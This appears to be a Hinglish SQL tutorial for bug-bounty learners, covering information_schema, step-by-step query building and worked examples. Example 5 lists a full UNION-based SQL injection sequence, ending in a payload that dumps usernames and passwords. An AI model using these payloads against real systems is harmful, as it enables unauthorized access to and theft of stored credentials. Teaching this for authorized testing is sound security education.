20. 🗄️ information_schema — Deep Dive

information_schema ek **system database** hai jo har MySQL/PostgreSQL/MSSQL installation mein automatically exist karta hai. Isme khud database ke baare mein metadata (data ka data) store hota hai — kaunse databases hain, kaunse tables hain, kaunse columns hain, unke types kya hain, etc. Bug bounty mein ye **sabse important recon tool** hai jab UNION-based SQLi confirm ho jati hai.

Important Tables Andar information_schema Ke

TableKya store karta hai
SCHEMATAServer pe available sabhi databases/schemas ki list
TABLESHar database ke sabhi tables ki list (naam, type, engine)
COLUMNSHar table ke sabhi columns ki list (naam, data type, nullable, default)
KEY_COLUMN_USAGEKaunse columns PRIMARY/FOREIGN KEY hain, unki relationships
TABLE_CONSTRAINTSTable pe lage constraints (UNIQUE, CHECK, FOREIGN KEY etc.)
STATISTICSTable ke indexes ki details
USER_PRIVILEGESCurrent DB user ko kya permissions mile hain
ROUTINESStored procedures aur functions ki list

Query Examples — information_schema Ke Saath

-- Sabhi databases list karo
SELECT schema_name FROM information_schema.schemata;

-- Current database ke sabhi tables list karo
SELECT table_name FROM information_schema.tables 
  WHERE table_schema = database();

-- Kisi specific table ke sabhi columns list karo
SELECT column_name, data_type FROM information_schema.columns 
  WHERE table_name = 'users';

-- Kisi table mein password/email jaisa column dhundo (naam se guess)
SELECT table_name, column_name FROM information_schema.columns 
  WHERE column_name LIKE '%pass%' OR column_name LIKE '%email%';

-- Kaunse columns PRIMARY KEY hain
SELECT column_name FROM information_schema.key_column_usage 
  WHERE table_name='users' AND constraint_name='PRIMARY';

-- Sabhi tables jinka naam 'admin' se related ho
SELECT table_name FROM information_schema.tables 
  WHERE table_name LIKE '%admin%';

-- Har table mein kitne columns hain, count karo
SELECT table_name, COUNT(*) as col_count FROM information_schema.columns 
  WHERE table_schema=database() GROUP BY table_name;

DB-wise Naming Difference

DBSchema access karne ka tarika
MySQLinformation_schema.tables, information_schema.columns — sabse standard aur common
PostgreSQLSame information_schema use hota hai, plus PostgreSQL-specific pg_catalog tables bhi hote hain
MSSQLinformation_schema.tables kaam karta hai, lekin sys.tables, sys.columns (system catalog views) bhi commonly use hote hain
OracleOracle mein information_schema nahi hota — iski jagah all_tables, all_tab_columns, user_tables use hote hain
Yaad rakhna: Oracle alag hai — usme information_schema exist nahi karta, wahan all_tables/all_tab_columns use karna padega. Baaki 3 DBs (MySQL, PostgreSQL, MSSQL) mein information_schema standard tarike se kaam karta hai.

21. 🔧 Building a Query Step-by-Step

Ab dekhte hain ki ek complex query kaise zero se build hoti hai — piece by piece.

1
Sabse pehle decide karo — kya chahiye?
Maan lo tumhe har city ke active users ka count chahiye, sirf un cities ka jinme 5 se zyada users hain, sabse zyada count wale city pehle.
2
SELECT se shuru karo — kaunse columns chahiye 
SELECT city, COUNT(*)
3
FROM add karo — kis table se 
SELECT city, COUNT(*)
FROM users
4
WHERE add karo — pehle row-level filter (sirf active users) 
SELECT city, COUNT(*)
FROM users
WHERE status = 'active'
5
GROUP BY add karo — city ke hisaab se group karna hai 
SELECT city, COUNT(*)
FROM users
WHERE status = 'active'
GROUP BY city
6
HAVING add karo — group-level filter (sirf 5+ wale) 
SELECT city, COUNT(*)
FROM users
WHERE status = 'active'
GROUP BY city
HAVING COUNT(*) > 5
7
ORDER BY add karo — sabse zyada count pehle 
SELECT city, COUNT(*)
FROM users
WHERE status = 'active'
GROUP BY city
HAVING COUNT(*) > 5
ORDER BY COUNT(*) DESC
8
Final touch — alias aur LIMIT (agar sirf top 3 chahiye) 
SELECT city, COUNT(*) AS user_count
FROM users
WHERE status = 'active'
GROUP BY city
HAVING COUNT(*) > 5
ORDER BY user_count DESC
LIMIT 3;
Execution order yaad rakho (query likhne ka order alag hai, execute hone ka order alag): FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY → LIMIT

22. 📚 Full Worked Examples (Real Scenarios)

Example 1: Do tables join karke report banana

Goal: Har user ka naam aur unke total orders ka amount nikalna

SELECT u.name, SUM(o.amount) AS total_spent
FROM users u
JOIN orders o ON u.id = o.user_id
GROUP BY u.name
ORDER BY total_spent DESC;

Kaise samjho: users aur orders ko id/user_id se join kiya, phir naam ke hisaab se group karke total nikala, sabse zyada spend karne wale pehle.

Example 2: Subquery se latest record nikalna

Goal: Sabse recent order kis user ne kiya, wo user nikalna

SELECT name FROM users
WHERE id = (
    SELECT user_id FROM orders
    ORDER BY order_date DESC
    LIMIT 1
);

Kaise samjho: Inner query pehle sabse latest order ka user_id nikalti hai, outer query us ID se user ka naam le aati hai.

Example 3: CASE WHEN se categorize karna

Goal: Users ko age ke hisaab se categories mein daalna

SELECT name, age,
  CASE
    WHEN age < 13 THEN 'Child'
    WHEN age BETWEEN 13 AND 19 THEN 'Teenager'
    WHEN age BETWEEN 20 AND 59 THEN 'Adult'
    ELSE 'Senior'
  END AS age_group
FROM users;

Example 4: CTE se readable complex query banana

Goal: Pehle high-value customers dhundo, phir unki details nikalo

WITH high_value_customers AS (
    SELECT user_id, SUM(amount) AS total
    FROM orders
    GROUP BY user_id
    HAVING SUM(amount) > 10000
)
SELECT u.name, h.total
FROM users u
JOIN high_value_customers h ON u.id = h.user_id
ORDER BY h.total DESC;

Kaise samjho: CTE (WITH) se ek temporary table jaisa result banaya jisme sirf high-spenders hain, phir usko normal table ki tarah JOIN kiya.

Example 5: SQLi Recon — information_schema Se Full Flow

Goal: Authorized target pe UNION SQLi confirm hone ke baad, database structure poori tarah map karna

-- Step 1: Column count nikalo
' ORDER BY 4--+

-- Step 2: Reflecting column dhundo
' UNION SELECT 1,2,3,4--+

-- Step 3: DB info nikalo
' UNION SELECT 1,database(),@@version,4--+

-- Step 4: Sabhi tables list karo
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables 
  WHERE table_schema=database()--+

-- Step 5: 'users' table ke columns nikalo
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns 
  WHERE table_name='users'--+

-- Step 6: Actual data dump karo
' UNION SELECT 1,username,password,4 FROM users--+

Kaise samjho: Ye poora flow information_schema ke bina possible nahi hota — ye hi wo "map" hai jisse pata chalta hai database ke andar kya-kya hai, bina table names guess kiye.

Example 6: Window Function se Ranking

Goal: Har department mein employees ko salary ke hisaab se rank dena

SELECT name, department, salary,
  RANK() OVER(PARTITION BY department ORDER BY salary DESC) AS dept_rank
FROM employees;

Kaise samjho: PARTITION BY department se har department alag se rank hota hai (global rank nahi), ORDER BY salary DESC se sabse zyada salary wala rank 1 milta hai.
